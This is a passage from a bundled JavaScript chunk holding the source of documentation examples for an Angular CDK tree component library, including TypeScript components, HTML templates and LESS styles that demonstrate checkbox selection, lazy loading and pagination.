[\n            {\n                name: "Green",\n                children: [{ name: "Broccoli" }, { name: "Brussels sprouts" }],\n            },\n            {\n                name: "Orange",\n                children: [{ name: "Pumpkins" }, { name: "Carrots" }],\n            },\n            {\n                name: "Red",\n            },\n        ],\n    },\n    {\n        name: "Fruit",\n        children: [\n            { name: "Apple" },\n            { name: "Banana" },\n            { name: "Fruit loops" },\n        ],\n    },\n    {\n        name: "Meat",\n    },\n];\n\n@Component({\n    selector: "nui-tree-checkbox-example",\n    templateUrl: "tree-checkbox.example.component.html",\n    styleUrls: ["tree-checkbox.example.component.less"],\n    host: { id: "nui-tree-checkbox-example" },\n    animations: [expand],\n})\nexport class TreeCheckboxExampleComponent {\n    public treeControl = new NestedTreeControl<FoodNode>(\n        (node) => node.children\n    );\n    public dataSource = new ArrayDataSource(TREE_DATA);\n    public selectionModel = new SelectionModel<FoodNode>(true);\n\n    public hasChild = (_: number, node: FoodNode): boolean =>\n        !!node.children?.length;\n\n    /** Whether all the descendants of the node are selected. */\n    public descendantsAllSelected(node: FoodNode): boolean {\n        const descendants = this.treeControl.getDescendants(node);\n        return (\n            descendants.length > 0 &&\n            descendants.every((child) => this.selectionModel.isSelected(child))\n        );\n    }\n\n    /** Whether part of the descendants are selected */\n    public descendantsPartiallySelected(node: FoodNode): boolean {\n        const descendants = this.treeControl.getDescendants(node);\n        const result = descendants.some((child) =>\n            this.selectionModel.isSelected(child)\n        );\n        return result && !this.descendantsAllSelected(node);\n    }\n\n    /** Toggle the branch selection. Select/deselect all the descendants node */\n    public branchItemSelectionToggle(node: FoodNode): void {\n        this.selectionModel.toggle(node);\n        const descendants = this.treeControl.getDescendants(node);\n        this.selectionModel.isSelected(node)\n            ? this.selectionModel.select(...descendants)\n            : this.selectionModel.deselect(...descendants);\n\n        // Force update for the parent\n        descendants.forEach((child) => this.selectionModel.isSelected(child));\n        this.checkAllParentsSelection(node);\n    }\n\n    /** Toggle a leaf item selection. Check all the parents to see if they changed */\n    public leafItemSelectionToggle(node: FoodNode): void {\n        this.selectionModel.toggle(node);\n        this.checkAllParentsSelection(node);\n    }\n\n    /** Checks all the parents when a leaf node is selected/unselected */\n    private checkAllParentsSelection(node: FoodNode): void {\n        let parent: FoodNode | undefined = this.getParentNode(node);\n        while (parent) {\n            this.checkRootNodeSelection(parent);\n            parent = this.getParentNode(parent);\n        }\n    }\n\n    /** Check root node checked state and change it accordingly */\n    private checkRootNodeSelection(node: FoodNode): void {\n        const nodeSelected = this.selectionModel.isSelected(node);\n        const descendants = this.treeControl.getDescendants(node);\n        const descAllSelected =\n            descendants.length > 0 &&\n            descendants.every((child) => this.selectionModel.isSelected(child));\n        if (nodeSelected && !descAllSelected) {\n            this.selectionModel.deselect(node);\n        } else if (!nodeSelected && descAllSelected) {\n            this.selectionModel.select(node);\n        }\n    }\n\n    /** Get the parent node of a node */\n    private getParentNode(node: FoodNode): FoodNode | undefined {\n        let parent: FoodNode | undefined;\n\n        // Don\'t need to get parent if node on the 0 level\n        if (TREE_DATA.find((n) => n === node)) {\n            return;\n        }\n\n        const search = (n: FoodNode): FoodNode | undefined => {\n            if (parent || !n.children) {\n                return;\n            }\n            if (n.children.find((i) => i === node)) {\n                parent = n;\n                return;\n            }\n            return n.children.find(search);\n        };\n\n        // invoke search on the level 0 items\n        TREE_DATA.forEach(search);\n\n        if (!parent) {\n            throw new Error("Parent wasn\'t found");\n        }\n\n        return parent;\n    }\n}\n'},4321:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    The Angular CDK Tree module provides a way to easily and declaratively\n    create Tree interfaces.\n</p>\n<p>\n    To get started, import <code>CdkTreeModule</code> into the NgModule where\n    you want to use <code>cdk-tree</code> features:\n</p>\n\n<nui-example-code language="typescript">{{\n    initialSetupCode\n}}</nui-example-code>\n\n<p>\n    For more details on the implementation of the @angular/cdk/tree, check the\n    documentation\n    <a href="https://material.angular.io/cdk/tree/overview" target="_blank"\n        >here</a\n    >\n</p>\n<h2>Required Modules</h2>\n<ul>\n    <li>Angular CDK\'s <code>CdkTreeModule</code></li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    This example shows how easy it is to create a <code>cdk-tree</code> element.\n    Our examples are using <code>nui-expander</code> css styles which we\n    recommend to use. To add <code>nui-expander</code> styles, add\n    <code>.expander()</code> mixin to the component styles. In the result,\n    appropriate css classes are generated which are used in the examples. For\n    example <code>.nui-tree__body</code> applies dotted line to the body of\n    branch, or <code>.nui-tree_header</code> applies\n    <code>cursor: pointer</code>. Look into examples to find more css classes or\n    extend existing css rules to achieve your goal.\n</p>\n<nui-example-wrapper filenamePrefix="basic" exampleTitle="Basic Usage">\n    <nui-tree-basic-example></nui-tree-basic-example>\n</nui-example-wrapper>\n\n<h2>Tree Styling</h2>\n<p>\n    To apply unique styles for the particular node, provide icon/css class/etc.\n    to this node in the <code>dataSource</code>, and use it as usually in the\n    template of component. Check the source code below:\n</p>\n<nui-example-wrapper filenamePrefix="styling" exampleTitle="Styling">\n    <nui-tree-styling-example></nui-tree-styling-example>\n</nui-example-wrapper>\n\n<h2>Tree Lazy-loading</h2>\n<p>\n    To implement lazy-loading on <code>CdkTree</code> component branches, use\n    <code>renderNodeChanges</code> method, in order to synchronize data-source\n    with DOM representation after an asynchronous operation has finished. Pay\n    attention to the <code>isLoading</code> flag into yours node objects while\n    implementing lazy-loading.\n</p>\n<nui-example-wrapper filenamePrefix="lazy" exampleTitle="Lazy loading">\n    <nui-tree-lazy-example></nui-tree-lazy-example>\n</nui-example-wrapper>\n\n<h2>Tree with checkboxes</h2>\n<p>\n    For handling state of checkboxes\n    <a\n        href="https://github.com/angular/components/blob/master/src/cdk/collections/selection-model.ts"\n        >SelectionModel</a\n    >\n    is used. You can easily grab all the selected items using\n    <code>SelectionModel.selected</code> or subscribe to the changes using\n    <code>SelectionModel.changed</code>. Check one of the checkboxes to see it\n    in action. This example also shows how to implement "indeterminate" state of\n    checkbox for branches.\n</p>\n<nui-example-wrapper filenamePrefix="checkbox" exampleTitle="Checkbox">\n    <nui-tree-checkbox-example></nui-tree-checkbox-example>\n</nui-example-wrapper>\n\n<h2>Tree with Checkboxes and Lazy Loading</h2>\n<p>\n    In case some selectable options are to be lazy loaded, it is possible to\n    load additional selectable options asynchronously, while still be able to\n    track the selection properly. In the following example there are several\n    places where some additional options are being loaded on demand. Once\n    triggered, if the parent selectable node is selected, all the lazy-loaded\n    selectables will get selected once they\'re loaded.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="checkbox-lazy"\n    exampleTitle="Checkbox with Lazy Loading"\n>\n    <nui-tree-checkbox-lazy></nui-tree-checkbox-lazy>\n</nui-example-wrapper>\n\n<h2>Tree with Pagination on Leaf nodes</h2>\n<p>\n    If you have many items on leaf nodes, you might be interested in loading the\n    data by parts. You can use pagination as one of the options for such a\n    purpose.\n</p>\n<p>\n    The example below shows how to do that. In terms of this example, it\'s\n    assumed that an API can return a necessary set of data for the node by it\'s\n    identificator. When you expand the node, it will load the first page and\n    then will display a paginator. At this point, on the first data fetch, an\n    API should return a total amount of items to pass it to the paginator.\n</p>\n<p>\n    It\'s also recommended to use <code>nui-paginator</code> for handling the\n    pagination.\n</p>\n<nui-example-wrapper\n    filenamePrefix="leaf-pagination"\n    exampleTitle="Pagination on the leaf nodes"\n>\n    <nui-tree-leaf-pagination-example></nui-tree-leaf-pagination-example>\n</nui-example-wrapper>\n\n<h2>Tree With Additional Elements</h2>\n<p>\n    To customize tree nodes, add any template. Below you see several typical\n    cases with adding additional templates (menu, tag) into the tree.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="with-additional-content"\n    exampleTitle="Tree With Additional Content"\n>\n    <nui-tree-with-additional-content-example></nui-tree-with-additional-content-example>\n</nui-example-wrapper>\n\n<h2>Tree Load More Nodes</h2>\n<p>The example below shows how to load data in portions using "Load More"</p>\n\n<nui-example-wrapper\n    filenamePrefix="load-more"\n    exampleTitle="Tree Load More Nodes"\n>\n    <nui-tree-load-more-example></nui-tree-load-more-example>\n</nui-example-wrapper>\n\n<h2>Tree With show all in dialog</h2>\n<p>\n    It\'s possible the case when there\'re too many items on the leaf node. In\n    this case, it\'s also possible to display all the items on the separate\n    screen. For example, inside the <code>nui-dialog</code>.\n</p>\n<p>\n    Current example uses Nova test BE service to get the data. It can send the\n    data by some portions for a certain criteria. In this current example,\n    there\'re 3 nodes that fetch the data per location, the service is\n    implementing Nova\n    <code\n        ><a href="../injectables/DataSourceService.html" target="_blank"\n            >DataSourceService</a\n        ></code\n    >.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="show-all-dialog"\n    exampleTitle="Tree With show all in dialog"\n>\n    <nui-tree-show-all-dialog-example></nui-tree-show-all-dialog-example>\n</nui-example-wrapper>\n'},16717:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tree-docs-example",\n    templateUrl: "./tree-docs.example.component.html",\n})\nexport class TreeDocsExampleComponent {\n    initialSetupCode = `\n// our module where we want to use tree features\nimport { CdkTreeModule } from "@angular/cdk/tree";\n\n@NgModule({\n    imports: [\n        CdkTreeModule,\n        // other modules that we might need\n    ],\n    declarations: [ /* our module declaration */],\n    exports:      [ /* our exports */ ],\n})\nexport class MyModule {}`.replace("\\r\\n", "<br/>"); // nice rendering\n}\n'},40961:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "mixins/expander-base";\n\n.nui-tree {\n    .expander();\n\n    &__body {\n        &--collapsed {\n            overflow: hidden;\n        }\n    }\n\n    &__leaf {\n        display: flex;\n        align-items: center;\n    }\n\n    &__invisible {\n        display: none;\n    }\n}\n'},62449:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<cdk-tree [dataSource]="dataSource" [treeControl]="treeControl">\n    <cdk-nested-tree-node *cdkTreeNodeDef="let node" class="nui-tree__leaf">\n        <button\n            nui-button\n            displayStyle="action"\n            type="button"\n            disabled\n        ></button>\n        {{ node.name }}\n    </cdk-nested-tree-node>\n    <cdk-nested-tree-node\n        #nestedNode="cdkNestedTreeNode"\n        *cdkTreeNodeDef="let node; when: hasChild"\n        class="nui-tree"\n    >\n        <div\n            class="nui-tree__header"\n            cdkTreeNodeToggle\n            (click)="loadMore(node, nestedNode)"\n        >\n            <nui-icon\n                class="nui-tree__header-icon"\n                icon="{{\n                    treeControl.isExpanded(node)\n                        ? \'triangle-down\'\n                        : \'triangle-right\'\n                }}"\n            ></nui-icon>\n            <span class="nui-tree__header-title"\n                >{{ node.name }} ({{ node.length }})</span\n            >\n        </div>\n        <div\n            class="nui-tree__body"\n            [class.nui-tree__body--collapsed]="!treeControl.isExpanded(node)"\n            [@expandedState]="\n                treeControl.isExpanded(node) ? \'expanded\' : \'collapsed\'\n            "\n        >\n            <nui-spinner\n                *ngIf="node.isLoading"\n                [show]="node.isLoading"\n                [delay]="0"\n            ></nui-spinner>\n            <ng-container cdkTreeNodeOutlet></ng-container>\n        </div>\n    </cdk-nested-tree-node>\n</cdk-tree>\n'},54653:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ArrayDataSource } from "@angular/cdk/collections";\nimport {\n    CdkNestedTreeNode,\n    CdkTree,\n    NestedTreeControl,\n} from "@angular/cdk/tree";\nimport {\n    Component,\n    Injectable,\n    IterableDiffer,\n    IterableDiffers,\n    ViewChild,\n} from "@angular/core";\nimport { Observable, of } from "rxjs";\nimport { delay } from "rxjs/operators";\n\nimport { expand } from "@nova-ui/bits";\n\ninterface FoodNode {\n    name: string;\n    children?: FoodNode[];\n    length?: number;\n    isLoading?: boolean;\n}\n\nconst TREE_DATA: FoodNode[] = [\n    {\n        name: "Fruit",\n        children: [],\n        length: 3,\n        isLoading: false,\n    },\n];\n\n@Injectable()\nclass HttpMock {\n    get(): Observable<FoodNode[]> {\n        const res: FoodNode[] = [\n            { name: "Banana" },\n            {\n                name: "Fruit",\n                children: [],\n                length: 3,\n                isLoading: false,\n            },\n            { name: "Fruit loops" },\n        ];\n        return of(res).pipe(delay(3000));\n    }\n}\n\n@Component({\n    selector: "nui-tree-lazy-example",\n    templateUrl: "./tree-lazy.example.component.html",\n    styleUrls: ["./tree-lazy.component.example.less"],\n    animations: [expand],\n    providers: [HttpMock],\n})\nexport class TreeLazyExampleComponent {\n    treeControl = new NestedTreeControl<FoodNode>((node) => node.children);\n    dataSource = new ArrayDataSource(TREE_DATA);\n\n    @ViewChild(CdkTree) private cdkTree: CdkTree<FoodNode>;\n\n    hasChild = (_: number, node: FoodNode): boolean => !!node.length;\n\n    constructor(private http: HttpMock, private differ: IterableDiffers) {}\n\n    loadMore(node: FoodNode, nestedNode: CdkNestedTreeNode<any>): void {\n        const differ: IterableDiffer<FoodNode> = this.differ\n            .find(node.children)\n            .create();\n\n        if (node.children?.length === node.length || node.isLoading) {\n            return;\n        }\n\n        node.isLoading = true;\n\n        this.http.get().subscribe((res: FoodNode[]) => {\n            node.isLoading = false;\n            node.children = res;\n            this.cdkTree.renderNodeChanges(\n                node.children,\n                differ,\n                nestedNode.nodeOutlet.first.viewContainer,\n                node\n            );\n        });\n    }\n}\n'},6327:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "mixins/expander-base";\n\n.nui-tree {\n    .expander();\n\n    &__body {\n        &--collapsed {\n            overflow: hidden;\n        }\n    }\n\n    &__leaf {\n        display: flex;\n        align-items: center;\n    }\n\n    &__invisible {\n        display: none;\n    }\n\n    .content-container {\n        min-height: 20px;\n    }\n}\n'},46039:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<cdk-tree [dataSource]="dataSource" [treeControl]="treeControl">\n    <cdk-nested-tree-node *cdkTreeNodeDef="let node" class="nui-tree__leaf">\n        <button\n            nui-button\n            displayStyle="action"\n            type="button"\n            disabled\n        ></button>\n        {{ node.name }}, fromPage: {{ node.page }}\n    </cdk-nested-tree-node>\n    <cdk-nested-tree-node\n        #nestedNode="cdkNestedTreeNode"\n        *cdkTreeNodeDef="let node; when: hasChild"\n        class="nui-tree"\n    >\n        <div\n            class="nui-tree__header"\n            (click)="onToggleClick(node, nestedNode)"\n            cdkTreeNodeToggle\n        >\n            <nui-icon\n                class="nui-tree__header-icon"\n                icon="{{\n                    treeControl.isExpanded(node)\n                        ? \'triangle-down\'\n                        : \'triangle-right\'\n                }}"\n            ></nui-icon>\n            <span class="nui-tree__header-title">{{ node.name }}</span>\n        </div>\n        <div\n            class="nui-tree__body"\n            [class.nui-tree__body--collapsed]="!treeControl.isExpanded(node)"\n            [@expandedState]="\n                treeControl.isExpanded(node) ? \'expanded\' : \'collapsed\'\n            "\n        >\n            <div nui-busy [busy]="node.isLoading" style="min-height: 20px">\n                <ng-container cdkTreeNodeOutlet></ng-container>\n                <nui-paginator\n                    *ngIf="node.hasPagination && nodesTotalItems[node.name]"\n                    [page]="1"\n                    [pageSize]="pageSize"\n                    (pagerAction)="loadNodeItems(node, nestedNode, $event)"\n                    [total]="nodesTotalItems[node.name]"\n                >\n                </nui-paginator>\n            </div>\n        </div>\n    </cdk-nested-tree-node>\n</cdk-tree>\n'},12015:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ArrayDataSource } from "@angular/cdk/collections";\nimport {\n    CdkNestedTreeNode,\n    CdkTree,\n    NestedTreeControl,\n} from "@angular/cdk/tree";\nimport {\n    Component,\n    IterableDiffer,\n    IterableDiffers,\n    ViewChild,\n} from "@angular/core";\n\nimport { DOCUMENT_CLICK_EVENT, EventBusService, expand } from "@nova-ui/bits";\n\nimport { HttpMockService } from "../http-mock.service";\n\ninterface FoodNode {\n    name: string;\n    page?: number;\n    children?: FoodNode[];\n    isLoading?: boolean;\n    hasPagination?: boolean;\n}\n\ninterface IApiResponse {\n    items: FoodNode[];\n    total: number;\n}\n\nconst TREE_DATA: FoodNode[] = [\n    {\n        name: "Food",\n        children: [\n            {\n                name: "Vegetables",\n                children: [],\n                hasPagination: true,\n            },\n            {\n                name: "Fruits",\n                children: [],\n                hasPagination: true,\n            },\n        ],\n    },\n];\n\n@Component({\n    selector: "nui-tree-leaf-pagination-example",\n    templateUrl: "./tree-leaf-pagination.example.component.html",\n    styleUrls: ["./tree-leaf-pagination.component.example.less"],\n    animations: [expand],\n    providers: [HttpMockService],\n})\nexport class TreeLeafPaginationExampleComponent {\n    public pageSize = 25; // used for \'nui-paginator\'\n    public nodesTotalItems: { [key: string]: number } = {};\n\n    public treeControl = new NestedTreeControl<FoodNode>(\n        (node) => node.children\n    );\n    public dataSource = new ArrayDataSource(TREE_DATA);\n\n    @ViewChild(CdkTree) private cdkTree: CdkTree<FoodNode>;\n\n    hasChild = (_: number, node: FoodNode): boolean => !!node.children;\n\n    constructor(\n        private http: HttpMockService,\n        private differ: IterableDiffers,\n        private eventBusService: EventBusService\n    ) {}\n\n    /** Load first page on first open */\n    public onToggleClick(\n        node: FoodNode,\n        nestedNode: CdkNestedTreeNode<any>\n    ): void {\n        this.eventBusService\n            .getStream(DOCUMENT_CLICK_EVENT)\n            .next(new MouseEvent("click"));\n\n        if (node.hasPagination && node.children && !node.children.length) {\n            const paginatorOptions = {\n                page: 1,\n                pageSize: this.pageSize,\n            };\n\n            this.loadNodeItems(node, nestedNode, paginatorOptions);\n        }\n    }\n\n    public loadNodeItems(\n        node: FoodNode,\n        nestedNodeDirective: CdkNestedTreeNode<any>,\n        paginatorOptions: any\n    ): void {\n        if (node.isLoading) {\n            return;\n        }\n\n        node.isLoading = true;\n\n        this.http\n            .getNodeItems(\n                node.name,\n                paginatorOptions.page,\n                paginatorOptions.pageSize\n            )\n            .subscribe((res: IApiResponse) => {\n                this.handleNodeTotalItems(node.name, res.total);\n                this.handleNodeContent(node, nestedNodeDirective, res.items);\n                node.isLoading = false;\n            });\n    }\n\n    private handleNodeTotalItems(nodeId: string, totalItems: number) {\n        this.nodesTotalItems[nodeId] = totalItems;\n    }\n\n    private handleNodeContent(\n        node: FoodNode,\n        nestedNodeDirective: CdkNestedTreeNode<any>,\n        items: FoodNode[]\n    ) {\n        node.children = [];\n        const differ: IterableDiffer<FoodNode> = this.differ\n            .find(node.children)\n            .create();\n        node.children = items;\n\n        // clear previously rendered leaf nodes\n        nestedNodeDirective.nodeOutlet.first.viewContainer.clear();\n        this.cdkTree.renderNodeChanges(\n            node.children,\n            differ,\n            nestedNodeDirective.nodeOutlet.first.viewContainer,\n            node\n        );\n    }\n}\n'},36337:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "mixins/expander-base";\n\n.nui-tree {\n    .expander();\n\n    &__body {\n        &--collapsed {\n            overflow: hidden;\n        }\n\n        a:hover {\n            text-decoration: none;\n            cursor: pointer;\n        }\n    }\n\n    &__leaf {\n        display: flex;\n        align-items: center;\n    }\n\n    &__invisible {\n        display: none;\n    }\n\n    .content-container {\n        min-height: 20px;\n    }\n}\n'},88385:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<cdk-tree [dataSource]="dataSource" [treeControl]="treeControl">\n    <cdk-nested-tree-node *cdkTreeNodeDef="let node" class="nui-tree__leaf">\n        <button\n            nui-button\n            displayStyle="action"\n            type="button"\n            disabled\n        ></button>\n        {{ node.name }}, fromPage: {{ node.page }}\n    </cdk-nested-tree-node>\n    <cdk-nested-tree-node\n        #nestedNode="cdkNestedTreeNode"\n        *cdkTreeNodeDef="let node; when: hasChild"\n        class="nui-tree"\n    >\n        <div\n            class="nui-tree__header"\n            (click)="onToggleClick(node, nestedNode)"\n            cdkTreeNodeToggle\n        >\n            <nui-icon\n                class="nui-tree__header-icon"\n                icon="{{\n                    treeControl.isExpanded(node)\n                        ? \'triangle-down\'\n                        : \'triangle-right\'\n                }}"\n            ></nui-icon>\n            <span class="nui-tree__header-title">{{ node.name }}</span>\n        </div>\n        <div\n            class="nui-tree__body"\n            [class.nui-tree__body--collapsed]="!treeControl.isExpanded(node)"\n            [@expandedState]="\n                treeControl.isExpanded(node) ? \'expanded\' : \'collapsed\'\n            "\n        >\n            <ng-container cdkTreeNodeOutlet></ng-container>\n            <div *ngIf="node.hasPagination">\n                <button\n                    nui-button\n                    displayStyle="action"\n                    type="button"\n                    disabled\n                ></button>\n                <a\n                    *ngIf="!node.isLoading"\n                    (click)="loadMoreItems(node, nestedNode)"\n                    >Load another {{ pageSize }} (of\n                    {{ remainingItemsCount[node.name] }})</a\n                >\n                <nui-spinner\n                    *ngIf="node.isLoading"\n                    [show]="node.isLoading"\n                    [delay]="0"\n                ></nui-spinner>\n            </div>\n        </div>\n    </cdk-nested-tree-node>\n</cdk-tree>\n'},58413:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ArrayDataSource } from "@angular/cdk/collections";\nimport {\n    CdkNestedTreeNode,\n    CdkTree,\n    NestedTreeControl,\n} from "@angular/cdk/tree";\nimport {\n    Component,\n    IterableDiffer,\n    IterableDiffers,\n    ViewChild,\n} from "@angular/core";\n\nimport { DOCUMENT_CLICK_EVENT, EventBusService, expand } from "@nova-ui/bits";\n\nimport { HttpMockService } from "../http-mock.service";\n\ninterface FoodNode {\n    name: string;\n    page?: number;\n    children?: FoodNode[];\n    isLoading?: boolean;\n    hasPagination?: boolean;\n}\n\ninterface IApiResponse {\n    items: FoodNode[];\n    total: number;\n}\n\nconst TREE_DATA: FoodNode[] = [\n    {\n        name: "Food",\n        children: [\n            {\n                name: "Vegetables",\n                children: [],\n                page: 1,\n                hasPagination: true,\n            },\n            {\n                name: "Fruits",\n                children: [],\n                page: 1,\n                hasPagination: true,\n            },\n        ],\n    },\n];\n\n@Component({\n    selector: "nui-tree-load-more-example",\n    templateUrl: "./tree-load-more.example.component.html",\n    styleUrls: ["./tree-load-more.component.example.less"],\n    animations: [expand],\n    providers: [HttpMockService],\n})\nexport class TreeLoadMoreExampleComponent {\n    public pageSize = 10;\n    public remainingItemsCount: { [key: string]: number } = {};\n\n    public treeControl = new NestedTreeControl<FoodNode>(\n        (node) => node.children\n    );\n    public dataSource = new ArrayDataSource(TREE_DATA);\n\n    @ViewChild(CdkTree) private cdkTree: CdkTree<FoodNode>;\n\n    hasChild = (_: number, node: FoodNode): boolean => !!node.children;\n\n    constructor(\n        private http: HttpMockService,\n        private differ: IterableDiffers,\n        private eventBusService: EventBusService\n    ) {}\n\n    /** Load first page on first open */\n    public onToggleClick(\n        node: FoodNode,\n        nestedNode: CdkNestedTreeNode<any>\n    ): void {\n        this.eventBusService\n            .getStream(DOCUMENT_CLICK_EVENT)\n            .next(new MouseEvent("click"));\n\n        if (node.hasPagination && node.children && !node.children.length) {\n            node.page = 1;\n            this.loadMoreItems(node, nestedNode);\n        }\n    }\n\n    public loadMoreItems(\n        node: FoodNode,\n        nestedNodeDirective: CdkNestedTreeNode<any>\n    ): void {\n        if (node.isLoading) {\n            return;\n        }\n\n        node.isLoading = true;\n\n        const page = node.page ? node.page++ : 1;\n\n        this.http\n            .getNodeItems(node.name, page, this.pageSize)\n            .subscribe((res: IApiResponse) => {\n                this.setRemainingItemsCount(node, res.total);\n                this.handleNodeContent(node, nestedNodeDirective, res.items);\n                node.isLoading = false;\n            });\n    }\n\n    private setRemainingItemsCount(node: FoodNode, totalItems: number) {\n        this.remainingItemsCount[node.name] = node.children\n            ? totalItems - node.children?.length\n            : totalItems;\n    }\n\n    private handleNodeContent(\n        node: FoodNode,\n        nestedNodeDirective: CdkNestedTreeNode<any>,\n        items: FoodNode[]\n    ) {\n        const differ: IterableDiffer<FoodNode> = this.differ\n            .find(node.children)\n            .create();\n        node.children?.push(...items);\n\n        // clear previously rendered leaf nodes\n        nestedNodeDirective.nodeOutlet.first.viewContainer.clear();\n        this.cdkTree.renderNodeChanges(\n            node.children || [],\n            differ,\n            nestedNodeDirective.nodeOutlet.first.viewContainer,\n            node\n        );\n    }\n}\n'},55761:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "mixins/expander-base";\n\n.nui-tree {\n    .expander();\n\n    &__body {\n        &--collapsed {\n            overflow: hidden;\n        }\n    }\n\n    &__leaf {\n        display: flex;\n        align-items: center;\n    }\n\n    &__invisible {\n        display: none;\n    }\n\n    .content-container {\n        min-height: 20px;\n    }\n\n    &__show-all {\n        margin-left: 30px;\n        cursor: pointer;\n    }\n}\n'},91457:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div style="max-width: 600px">\n    <cdk-tree\n        class="nui-tree"\n        [dataSource]="dataSource"\n        [treeControl]="treeControl"\n    >\n        <cdk-nested-tree-node *cdkTreeNodeDef="let node" class="nui-tree__leaf">\n            <button\n                nui-button\n                displayStyle="action"\n                type="button"\n                disabled\n            ></button>\n            <div class="d-flex justify-content-between w-100">\n                <span>Node: {{ node.name }}</span>\n                <span> Status: {{ node.status }}</span>\n            </div>\n        </cdk-nested-tree-node>\n        <cdk-nested-tree-node\n            #nestedNode="cdkNestedTreeNode"\n            *cdkTreeNodeDef="let node; when: hasChild"\n            class="nui-tree__branch"\n        >\n            <div\n                class="nui-tree__header"\n                